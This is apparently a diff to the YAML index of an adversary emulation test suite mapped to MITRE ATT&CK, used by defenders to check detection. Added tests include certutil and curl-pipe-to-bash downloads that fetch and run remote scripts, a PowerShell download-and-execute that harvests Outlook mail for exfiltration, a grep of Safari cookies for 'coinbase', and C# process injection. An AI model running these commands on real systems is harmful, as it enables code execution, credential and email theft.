@@ -5032,7 +5032,7 @@ defense-evasion:
         name: command_prompt
         command: |
           cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp
-          cmd.exe /c %temp%tcm.tmp -decode #{executable}
+          cmd.exe /c %temp%tcm.tmp -decode #{executable} file.txt
   T1089:
     technique:
       id: attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044
@@ -7942,6 +7942,26 @@ defense-evasion:
         command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
 '
+    - name: Process Injection via C#
+      description: |
+        Process Injection using C#
+        reference: https://github.com/pwndizzle/c-sharp-memory-injection
+        Excercises Five Techniques
+        1. Process injection
+        2. ApcInjectionAnyProcess
+        3. ApcInjectionNewProcess
+        4. IatInjection
+        5. ThreadHijack
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_binary:
+          description: Output Binary
+          type: Path
+          default: T1055.exe
+      executor:
+        name: command_prompt
+        command: ".\\bin\\#{exe_binary}\n"
   T1121:
     technique:
       id: attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302
@@ -10626,6 +10646,26 @@ privilege-escalation:
         command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
 '
+    - name: Process Injection via C#
+      description: |
+        Process Injection using C#
+        reference: https://github.com/pwndizzle/c-sharp-memory-injection
+        Excercises Five Techniques
+        1. Process injection
+        2. ApcInjectionAnyProcess
+        3. ApcInjectionNewProcess
+        4. IatInjection
+        5. ThreadHijack
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_binary:
+          description: Output Binary
+          type: Path
+          default: T1055.exe
+      executor:
+        name: command_prompt
+        command: ".\\bin\\#{exe_binary}\n"
   T1053:
     technique:
       id: attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9
@@ -17764,6 +17804,51 @@ lateral-movement:
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
 '
+    - name: certutil download (urlcache)
+      description: 'Use certutil -urlcache argument to download a file from the web.
+        Note - /urlcache also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: command_prompt
+        command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+
+'
+    - name: certutil download (verifyctl)
+      description: 'Use certutil -verifyctl argument to download a file from the web.
+        Note - /verifyctl also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: powershell
+        command: |
+          $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
+          New-Item -Path $datePath -ItemType Directory
+          Set-Location $datePath
+          certutil -verifyctl -split -f #{remote_file}
+          Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
   T1077:
     technique:
       id: attack-pattern--ffe742ed-9100-4686-9e00-c331da544787
@@ -18309,19 +18394,18 @@ collection:
       created: '2017-05-31T21:30:58.938Z'
       identifier: T1074
     atomic_tests:
-    - name: Stage data from Discovery.bat
-      description: 'Utilize powershell to download discovery.bat and save to a local
-        file
+    - name: Stage data from Discovery.sh
+      description: 'Utilize curl to download discovery.sh and execute a basic information
+        gathering shell script
 
 '
       supported_platforms:
-      - windows
+      - linux
+      - macos
       executor:
-        name: powershell
-        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
-          > c:\windows\pi.log
-
-'
+        name: bash
+        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.sh
+          | bash -s > /tmp/discovery.log
   '':
     technique:
       id: attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf
@@ -18365,6 +18449,122 @@ collection:
       modified: '2018-10-17T00:14:20.652Z'
       created: '2017-05-31T21:31:37.917Z'
     atomic_tests: []
+  T1005:
+    technique:
+      id: attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Data from Local System
+      description: |-
+        Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.
+
+        Adversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
+      external_references:
+      - external_id: T1005
+        url: https://attack.mitre.org/techniques/T1005
+        source_name: mitre-attack
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_detection: Monitor processes and command-line arguments for actions
+        that could be taken to collect files from a system. Remote access tools with
+        built-in features may interact directly with the Windows API to gather data.
+        Data may also be acquired through Windows system management tools such as
+        [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
+        and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_system_requirements:
+      - Privileges to access certain files and directories
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: collection
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:30:20.537Z'
+      identifier: T1005
+    atomic_tests:
+    - name: Search macOS Safari Cookies
+      description: 'This test uses `grep` to search a macOS Safari binaryCookies file
+        for specified values. This was used by CookieMiner malware.
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        search_string:
+          description: String to search Safari cookies to find.
+          type: string
+          default: coinbase
+      executor:
+        name: sh
+        command: |
+          cd ~/Library/Cookies
+          grep -q "#{search_string}" "Cookies.binarycookies"
+  T1114:
+    technique:
+      id: attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Email Collection
+      description: |-
+        Adversaries may target user email to collect sensitive information from a target.
+
+        Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.
+
+        Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.
+
+        Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.
+      external_references:
+      - external_id: T1114
+        url: https://attack.mitre.org/techniques/T1114
+        source_name: mitre-attack
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Authentication logs
+      - File monitoring
+      - Process monitoring
+      - Process use of network
+      x_mitre_detection: |-
+        There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.
+
+        File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.
+
+        Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: collection
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:25.454Z'
+      identifier: T1114
+    atomic_tests:
+    - name: T1114 Email Collection with PowerShell
+      description: 'Search through local Outlook installation, extract mail, compress
+        the contents, and saves everything to a directory for later exfiltration.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        command: |
+          Display email contents in the terminal
+            PS C:\> .\Get-Inbox.ps1
+
+          Write emails out to a CSV
+            PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+
+          Download and Execute
+            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Get-Inbox.ps1')"
   T1056:
     technique:
       id: attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2
@@ -19446,6 +19646,51 @@ command-and-control:
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
 '
+    - name: certutil download (urlcache)
+      description: 'Use certutil -urlcache argument to download a file from the web.
+        Note - /urlcache also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: command_prompt
+        command: 'cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+
+'
+    - name: certutil download (verifyctl)
+      description: 'Use certutil -verifyctl argument to download a file from the web.
+        Note - /verifyctl also works!
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        name: powershell
+        command: |
+          $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
+          New-Item -Path $datePath -ItemType Directory
+          Set-Location $datePath
+          certutil -verifyctl -split -f #{remote_file}
+          Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
   T1065:
     technique:
       id: attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0
